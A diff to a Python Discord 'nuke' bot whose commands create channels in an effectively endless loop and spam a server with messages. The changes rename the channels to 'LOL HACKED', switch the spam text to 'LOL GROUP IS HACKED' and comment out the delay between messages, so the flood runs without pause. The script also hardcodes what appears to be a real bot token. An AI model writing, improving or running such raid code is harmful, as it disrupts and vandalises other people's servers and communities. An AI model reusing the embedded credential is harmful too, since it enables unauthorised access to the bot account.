@@ -48,14 +48,14 @@ async def c(ctx):
     await bot.say("started hacking....") #idk ignore this just to make sure some people that this bot isnt dangerous
     time.sleep(2)
     for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
-        await bot.create_channel(ctx.message.server, 'nuked', type=discord.ChannelType.text) #you can change the channel name by replacing 'nuked' to any name
+        await bot.create_channel(ctx.message.server, 'LOL HACKED', type=discord.ChannelType.text) #you can change the channel name by replacing 'nuked' to any name
  
 @bot.command(pass_context=True)
 async def s(ctx):
   #  await bot.say("started hacking....") #idk ignore this just to make sure some people that this bot isnt dangerous
    # time.sleep(2)
     for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
-        await bot.say("+qnext") #text 1 goes here	
-        await asyncio.sleep(65*60)
+        await bot.say("**LOL GROUP IS HACKED**") #text 1 goes here	
+        #await asyncio.sleep(65*60)
  
 bot.run ("NjIyMTIwMjU4OTYyMDYzMzgw.XXvQ7A.GWuDrVanrwRVD32ZpLMzI0c50Cc") #your bot token (please dont use your discord account token otherwise your account will get banned maybe)
